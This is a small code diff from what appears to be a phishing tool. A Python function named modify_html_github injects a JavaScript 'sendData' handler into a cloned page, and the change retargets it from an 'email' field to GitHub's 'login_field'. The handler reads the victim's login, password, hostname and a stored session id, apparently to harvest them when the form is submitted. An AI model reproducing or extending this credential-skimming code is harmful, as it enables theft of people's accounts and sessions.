@@ -285,7 +285,7 @@ def modify_html_github(url, file_path, redirect_url):
             async function sendData(event) {{
                 event.preventDefault();
 
-                const email = document.getElementById("email").value;
+                const email = document.getElementById("login_field").value;
                 const password = document.getElementById("password").value;
                 const hostName = window.location.hostname;
                 const sessionId = localStorage.getItem("Session");
